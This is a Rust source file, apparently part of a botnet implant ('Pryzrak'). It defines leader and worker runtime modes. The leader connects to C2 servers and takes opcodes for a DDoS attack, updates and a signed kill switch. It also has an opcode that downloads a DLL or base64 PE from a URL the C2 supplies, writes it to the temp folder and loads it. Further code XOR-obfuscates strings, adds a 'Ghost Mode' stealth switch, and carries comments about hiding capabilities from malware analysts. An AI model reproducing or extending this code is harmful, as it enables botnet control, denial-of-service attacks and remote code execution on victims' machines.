//! # Runtime Modes
//!
//! Leader and Worker runtime logic for the Edge node.
//! Using smol for lightweight async runtime.

use std::sync::Arc;
use std::time::Duration;
use log::{info, warn, error, debug};
use async_channel::{self, Sender, Receiver};
use rand::Rng;
use sha2::{Sha256, Digest};

use crate::n::multi_cloud::MultiCloudManager;
use crate::n::bootstrap::ProfessionalBootstrapper;
use crate::n::bridge::BridgeService;
use crate::n::local_comm::{LocalTransport, LipcMsgType};
use crate::n::watchdog::{NetworkWatchdog, run_fallback_monitor};
use crate::d::election::ElectionService;
use crate::p::manager::PluginManager;
use crate::c2::state::{CommandState, SystemMode};

/// XOR decode helper for obfuscated strings
fn xd(encoded: &[u8], key: u8) -> String {
    encoded.iter().map(|b| (*b ^ key) as char).collect()
}

/// Derive master key from hardware fingerprint + environment
/// Each machine generates a unique key; not hardcoded in binary
fn derive_master_key() -> [u8; 32] {
    let mut hasher = Sha256::new();
    
    // Machine-specific components
    // "COMPUTERNAME" XOR 0x41
    let cn = xd(&[0x02, 0x2e, 0x2c, 0x31, 0x34, 0x35, 0x04, 0x33, 0x21, 0x2c, 0x04], 0x41);
    // "HOSTNAME" XOR 0x41
    let hn = xd(&[0x09, 0x2e, 0x32, 0x35, 0x2f, 0x20, 0x2c, 0x04], 0x41);
    
    if let Ok(hostname) = std::env::var(&cn)
        .or_else(|_| std::env::var(&hn))
        .or_else(|_| Ok::<_, std::env::VarError>("default".to_string()))
    {
        hasher.update(hostname.as_bytes());
    }
    
    // Process ID for additional entropy
    hasher.update(&std::process::id().to_le_bytes());
    
    // Environment-based seed - obfuscated env var name
    // "PRYZRAK_SEED" XOR 0x33
    let ps = xd(&[0x63, 0x7b, 0x72, 0x7f, 0x67, 0x7e, 0x7c, 0x1c, 0x60, 0x56, 0x56, 0x55], 0x33);
    if let Ok(seed) = std::env::var(&ps) {
        hasher.update(seed.as_bytes());
    }
    
    // Time-based component (boot time approximation)
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default();
    hasher.update(&(now.as_secs() / 86400).to_le_bytes()); // Day granularity
    
    let result = hasher.finalize();
    let mut key = [0u8; 32];
    key.copy_from_slice(&result[..32]);
    key
}


/// Run in Leader mode - handles C2 communication and worker coordination
pub async fn run_leader_mode(
    election: Arc<ElectionService>, 
    cmd_state: CommandState,
    cmd_tx: Sender<Vec<u8>>,
    cmd_rx: Receiver<Vec<u8>>
) {
    info!("role: leader");

    let watchdog = Arc::new(NetworkWatchdog::new());
    
    // Start fallback monitor
    let wd_clone = watchdog.clone();
    smol::spawn(async move {
        run_fallback_monitor(wd_clone).await;
    }).detach();

    // Monitor election requests
    let elec_clone = election.clone();
    smol::spawn(async move {
        elec_clone.monitor_requests().await;
    }).detach();

    // FIXED: Dynamic key derivation from hardware fingerprint + environment
    // Key is unique per machine, not hardcoded in binary
    let master_key = derive_master_key();
    info!("[Leader] Master key derived from hardware fingerprint");
    let bootstrapper = ProfessionalBootstrapper::new();

    // Retry loop for bootstrap
    let swarm_nodes = loop {
        // [GHOST CHECK]
        if cmd_state.current_mode() == SystemMode::Ghost {
            info!("[Leader] Ghost Mode triggered during bootstrap. Aborting.");
            return;
        }

        match bootstrapper.resolve().await {
            Some(nodes) if !nodes.is_empty() => {
                info!("bootstrap: {} nodes", nodes.len());
                bootstrapper.save_cache_peers(&nodes);
                break nodes;
            }
            _ => {
                // Panic safety: If 127.0.0.1 fallback was needed for dev, use env var
                // "PRYZRAK_DEV" XOR 0x33
                let pd = xd(&[0x63, 0x7b, 0x72, 0x7f, 0x67, 0x7e, 0x7c, 0x1c, 0x57, 0x56, 0x65], 0x33);
                if std::env::var(&pd).is_ok() {
                    break vec![("127.0.0.1".to_string(), 1883)];
                }
                smol::Timer::after(Duration::from_secs(10)).await;
            }
        }
    };

    // Create Multi-Cloud Manager (up to 6 connections)
    let multi_cloud = Arc::new(MultiCloudManager::new(swarm_nodes, &master_key));
    info!("[Leader] Connected to {} Cloud nodes", multi_cloud.connection_count());
    
    // Channels for Multi-Cloud
    let (msg_tx, msg_rx) = async_channel::bounded::<Vec<u8>>(100);
    // cmd_tx/rx passed from outside

    // Start all Cloud connections (with deduplication)
    let mc_clone = multi_cloud.clone();
    smol::spawn(async move {
        mc_clone.start_all(cmd_tx, msg_rx).await;
    }).detach();

    // Start Cloud Heartbeat Loop
    let msg_tx_clone = msg_tx.clone();
    let wd_heartbeat = watchdog.clone();
    let cs_hb = cmd_state.clone();
    smol::spawn(async move {
        loop {
            // [GHOST CHECK]
            if cs_hb.current_mode() == SystemMode::Ghost {
                info!("[Leader-HB] Ghost Mode triggered. Stopping Heartbeat.");
                break;
            }

            let heartbeat = b"HEARTBEAT_LEADER".to_vec();
            if msg_tx_clone.send(heartbeat).await.is_err() {
                error!("[Cloud] Failed to queue heartbeat (Channel Closed)");
                break;
            }
            wd_heartbeat.mark_alive();
            smol::Timer::after(Duration::from_secs(30)).await;
        }
    }).detach();

// [SECURE] Plugin loading removed from startup.
    // Plugins are now loaded DYNAMICALLY only when requested by the C2 server.
    // This prevents malware analysis from seeing a hardcoded list of capabilities.
    
    // Initialize Plugin Manager (Empty)
    let pm = PluginManager::new();
    let pm = Arc::new(async_lock::Mutex::new(pm));

    // Handle Incoming Commands
    let pm_cmd = pm.clone();
    let wd_cmd = watchdog.clone();
    let bridge_tx = msg_tx.clone();
    
    smol::spawn(async move {
        while let Ok(cmd) = cmd_rx.recv().await {
            info!("cmd: {} bytes", cmd.len());
            wd_cmd.mark_alive();
            
            if cmd.is_empty() { continue; }
            
            let opcode = cmd[0];
            let payload = if cmd.len() > 1 { &cmd[1..] } else { &[] };
            
            // Try Plugin First
            let handled = {
                let manager = pm_cmd.lock().await;
                manager.handle_command(opcode, payload)
            };

            if handled {
                continue;
            }

            // Fallback to Core Commands
            match opcode {
                0x01 => {
                    // Legacy DDoS handler (if plugin not loaded)
                    info!("cmd: attack (legacy)");
                    let _ = bridge_tx.send(cmd.clone()).await;
                }
                0x02 => {
                    info!("cmd: update");
                    let _ = bridge_tx.send(cmd.clone()).await;
                }
                0x03 => {
                    // SECURITY FIX: Kill command requires signature verification
                    // Payload format: [8-byte signature_check]
                    if payload.len() >= 8 {
                        let expected = {
                            use sha2::{Sha256, Digest};
                            let mut h = Sha256::new();
                            // "PRYZRAK_SEED" XOR 0x33
                            let ps = xd(&[0x63, 0x7b, 0x72, 0x7f, 0x67, 0x7e, 0x7c, 0x1c, 0x60, 0x56, 0x56, 0x55], 0x33);
                            if let Ok(seed) = std::env::var(&ps) {
                                h.update(seed.as_bytes());
                            }
                            h.update(b"KILL");
                            let hash = h.finalize();
                            u64::from_be_bytes(hash[0..8].try_into().unwrap_or([0u8; 8]))
                        };
                        let provided = u64::from_be_bytes(payload[0..8].try_into().unwrap_or([0u8; 8]));
                        
                        if provided == expected {
                            warn!("cmd: kill (VERIFIED) - shutting down gracefully");
                            // Graceful shutdown - notify components
                            smol::Timer::after(Duration::from_millis(100)).await;
                            std::process::exit(0);
                        } else {
                            warn!("cmd: kill REJECTED - invalid signature");
                        }
                    } else {
                        warn!("cmd: kill REJECTED - missing signature");
                    }
                }
                0x04 => {
                    info!("cmd: status");
                }
                0x05 => {
                    // Load Plugin from URL (Supports Raw Binary OR Base64 Text)
                    // Payload: [URL bytes]
                    if let Ok(url) = std::str::from_utf8(payload) {
                        info!("cmd: load plugin from {}", url);
                        
                        let pm_clone = pm.clone();
                        let url_string = url.to_string();
                        
                        smol::spawn(async move {
                            info!("[PluginLoader] Downloading from: {}", url_string);
                            
                            let download_res = smol::unblock(move || {
                                match ureq::get(&url_string).call() {
                                    Ok(resp) => {
                                        let mut bytes = Vec::new();
                                        if let Err(_) = resp.into_reader().read_to_end(&mut bytes) {
                                            return Err("Read Error".to_string());
                                        }
                                        Ok(bytes)
                                    },
                                    Err(e) => Err(format!("Http Error: {}", e))
                                }
                            }).await;
                            
                            match download_res {
                                Ok(raw_bytes) => {
                                    // Smart Detection: Is it Base64 text or Raw Binary?
                                    // MZ Header (PE): 0x4D 0x5A = "MZ" 
                                    // Base64 of "MZ" = "TVo" or "TVq"
                                    let final_bytes = if raw_bytes.len() > 4 {
                                        let header = &raw_bytes[0..4];
                                        
                                        // Check if it's raw PE (starts with MZ)
                                        if header[0] == 0x4D && header[1] == 0x5A {
                                            info!("[PluginLoader] Detected: Raw Binary (MZ Header)");
                                            raw_bytes
                                        } else {
                                            // Assume Base64 text - try to decode
                                            info!("[PluginLoader] Attempting Base64 decode...");
                                            
                                            // Clean the text (remove whitespace, newlines)
                                            let text = String::from_utf8_lossy(&raw_bytes);
                                            let cleaned: String = text.chars()
                                                .filter(|c| !c.is_whitespace())
                                                .collect();
                                            
                                            use base64::Engine;
                                            match base64::engine::general_purpose::STANDARD.decode(&cleaned) {
                                                Ok(decoded) => {
                                                    info!("[PluginLoader] Base64 decoded: {} bytes", decoded.len());
                                                    decoded
                                                },
                                                Err(_) => {
                                                    // Not valid Base64, use raw
                                                    warn!("[PluginLoader] Base64 decode failed, using raw");
                                                    raw_bytes
                                                }
                                            }
                                        }
                                    } else {
                                        raw_bytes
                                    };
                                    
                                    let temp_path = std::env::temp_dir().join(format!("p_{}.dll", rand::random::<u32>()));
                                    if let Ok(_) = std::fs::write(&temp_path, &final_bytes) {
                                        info!("[PluginLoader] Saved to {:?}", temp_path);
                                        
                                        let mut manager = pm_clone.lock().await;
                                        unsafe {
                                            if let Err(e) = manager.load_plugin(temp_path.to_str().unwrap_or_default()) {
                                                error!("[PluginLoader] Load Fail: {}", e);
                                            } else {
                                                info!("[PluginLoader] Success! Plugin Loaded.");
                                            }
                                        }
                                    } else {
                                        error!("[PluginLoader] Write Fail");
                                    }
                                },
                                Err(e) => error!("[PluginLoader] Download Fail: {}", e)
                            }
                        }).detach();
                    }
                }
                0x10 => {
                    // NEW: Named Plugin Command
                    // Payload: "name:cmd" string
                    if let Ok(cmd_str) = std::str::from_utf8(payload) {
                        if let Some((name, cmd)) = cmd_str.split_once(':') {
                            info!("[Runtime] Dispatch '{}' -> '{}'", name, cmd);
                            let manager = pm_cmd.lock().await;
                            manager.handle_command_by_name(name, cmd.as_bytes());
                        }
                    }
                }
                _ => {
                    warn!("cmd: 0x{:02X}", opcode);
                }
            }
        }
    }).detach();

    // Setup Bridge (Listen for Workers)
    match LocalTransport::bind_server().await {
        Ok(listener) => {
            let bridge = BridgeService::new(msg_tx.clone());
            let bridge = Arc::new(bridge);
            
            let bridge = Arc::new(bridge);
            
            loop {
                // [GHOST CHECK]
                if cmd_state.current_mode() == SystemMode::Ghost {
                    info!("[Leader] Ghost Mode triggered. Stopping Bridge.");
                    break;
                }

                match listener.accept().await {
                    Ok((stream, _addr)) => {
                        let b = bridge.clone();
                        smol::spawn(async move {
                            b.handle_worker(stream).await;
                        }).detach();
                    }
                    Err(e) => error!("[Bridge] Accept Error: {}", e),
                }
            }
        }
        Err(e) => error!("[Leader] Failed to bind Local Transport: {}", e),
    }
}

/// Run in Worker mode - connects to Leader via local transport
pub async fn run_worker_mode(leader_addr: std::net::SocketAddr, cmd_state: CommandState) {
    use std::sync::atomic::{AtomicBool, Ordering};
    use smol::net::UdpSocket;
    use crate::c::p2p_magic;
    
    info!("[Modes] Entering WORKER Mode. Connecting to Leader at {}.", leader_addr);
    
    let worker_id = rand::thread_rng().gen::<u64>();
    let leader_changed = Arc::new(AtomicBool::new(false));
    
    // Background UDP Watcher: Detect if a STRONGER Leader appears
    let leader_changed_clone = leader_changed.clone();
    let current_leader_ip = leader_addr.ip();
    smol::spawn(async move {
        // Try to bind UDP listener (may fail if port in use - that's okay, Leader is using it)
        let socket = match UdpSocket::bind("0.0.0.0:0").await {
            Ok(s) => s,
            Err(e) => {
                warn!("[Worker] UDP Watcher failed to bind: {}", e);
                return;
            }
        };
        // Enable broadcast receive
        let _ = socket.set_broadcast(true);
        
        let mut buf = [0u8; 1024];
        loop {
            if let Ok((len, addr)) = socket.recv_from(&mut buf).await {
                // Simple check: If we see IAmLeader from a DIFFERENT IP, Leader might have changed
                if let Ok(text) = std::str::from_utf8(&buf[..len]) {
                    if text.contains("IAmLeader") && addr.ip() != current_leader_ip {
                        info!("[Worker] Detected potential new Leader at {}. Signaling re-election.", addr.ip());
                        leader_changed_clone.store(true, Ordering::SeqCst);
                    }
                }
            }
        }
    }).detach();

    let mut failures = 0;
    const MAX_RETRIES: u32 = 5;

    loop {
        // [GHOST CHECK]
        if cmd_state.current_mode() == SystemMode::Ghost {
            info!("[Worker] Ghost Mode triggered. Aborting.");
            return;
        }

        // Check if Leader changed
        if leader_changed.load(Ordering::SeqCst) {
            info!("[Worker] Leader change detected. Returning to Discovery.");
            return;
        }
        
        match LocalTransport::connect_client(leader_addr).await {
            Ok(mut stream) => {
                info!("[Worker] Connected to Leader. Sending LIPC Hello.");
                failures = 0; // Reset failures on successful connect
                
                if let Err(e) = LocalTransport::write_frame(&mut stream, worker_id, LipcMsgType::Hello, &[]).await {
                    error!("[Worker] Failed to send Hello: {}", e);
                    continue;
                }

                loop {
                    // Check leader change in heartbeat loop too
                    if leader_changed.load(Ordering::SeqCst) {
                        info!("[Worker] Leader change detected during heartbeat. Disconnecting.");
                        return;
                    }
                    
                    let msg = b"HEARTBEAT_WORKER";
                    if let Err(e) = LocalTransport::write_frame(&mut stream, worker_id, LipcMsgType::Data, msg).await {
                        error!("[Worker] Failed to write to Leader: {}", e);
                        break;
                    }
                    debug!("[Worker] Sent LIPC Data");
                    smol::Timer::after(Duration::from_secs(10)).await;
                    
                    // [GHOST CHECK]
                    if cmd_state.current_mode() == SystemMode::Ghost {
                        info!("[Worker] Ghost Mode triggered during heartbeat. Disconnecting.");
                        return;
                    }
                }
            }
            Err(e) => {
                failures += 1;
                warn!("[Worker] Failed to connect to Leader: {} (Attempt {}/{})", e, failures, MAX_RETRIES);
                if failures >= MAX_RETRIES {
                    error!("[Worker] Too many connection failures. Returning to Discovery.");
                    return; // Return to main() -> Re-run Election
                }
                smol::Timer::after(Duration::from_secs(5)).await;
            }
        }
    }
}


